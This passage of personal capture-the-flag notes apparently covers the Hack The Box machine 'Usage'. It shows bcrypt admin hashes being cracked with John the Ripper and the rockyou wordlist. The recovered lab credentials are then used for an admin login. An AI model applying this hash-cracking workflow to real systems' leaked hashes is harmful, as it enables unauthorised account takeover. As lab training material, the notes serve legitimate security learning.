
**-----------------------------------------------------------------------------------------**

user: admin@usage.htb
password: \$2y\$10\$dVAYyH/Wj6ri3oFRIC0w9OHkubPpMsyVAeB/Ga/ews2GWpi0DawV.

```bash
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=./Downloads/rockyou.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 0.00% (ETA: 2024-08-15 11:55) 0g/s 30.73p/s 30.73c/s 30.73C/s charlie..barbie
0g 0:00:00:04 0.00% (ETA: 2024-08-15 16:10) 0g/s 30.95p/s 30.95c/s 30.95C/s 555555..carolina
0g 0:00:00:05 0.00% (ETA: 2024-08-15 19:20) 0g/s 30.83p/s 30.83c/s 30.83C/s dolphin..heather
0g 0:00:00:06 0.00% (ETA: 2024-08-15 21:25) 0g/s 30.79p/s 30.79c/s 30.79C/s heaven..baseball
0g 0:00:00:07 0.00% (ETA: 2024-08-15 19:27) 0g/s 30.80p/s 30.80c/s 30.80C/s angelica..mahalko
0g 0:00:02:17 0.02% (ETA: 2024-08-16 10:52) 0g/s 28.62p/s 28.62c/s 28.62C/s chunky..benito
0g 0:00:03:57 0.04% (ETA: 2024-08-16 06:44) 0g/s 28.95p/s 28.95c/s 28.95C/s chilli..barbados
0g 0:00:05:37 0.06% (ETA: 2024-08-16 04:50) 0g/s 29.08p/s 29.08c/s 29.08C/s mackenzie1..lover101
0g 0:00:09:00 0.09% (ETA: 2024-08-16 04:30) 0g/s 29.00p/s 29.00c/s 29.00C/s littlefoot..krisna
0g 0:00:18:22 0.20% (ETA: 2024-08-15 16:57) 0g/s 31.27p/s 31.27c/s 31.27C/s naneng..mystyle
0g 0:00:45:03 0.44% (ETA: 2024-08-16 09:10) 0g/s 28.12p/s 28.12c/s 28.12C/s hotlegs..hotbitch1
0g 0:00:49:12 0.49% (ETA: 2024-08-16 05:46) 0g/s 28.65p/s 28.65c/s 28.65C/s parker11..paradiso
admin123         (?)     
1g 0:00:52:02 DONE (2024-08-09 07:52) 0.000320g/s 28.82p/s 28.82c/s 28.82C/s adolf..adam20
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                          
```

This one seems to lead nowhere
**-----------------------------------------------------------------------------------------**

user: admin
password:

```bash
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=./Downloads/rockyou.txt       
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Remaining 1 password hash
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 0.00% (ETA: 2024-08-14 21:51) 0g/s 37.17p/s 37.17c/s 37.17C/s 456789..rebecca
whatever1        (?)     
1g 0:00:00:46 DONE (2024-08-09 09:32) 0.02156g/s 34.21p/s 34.21c/s 34.21C/s alexis1..cameron1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

These turn out to be the correct credentials for the admin in the admin.usage.htb domain. We will continue in [[admin login site]]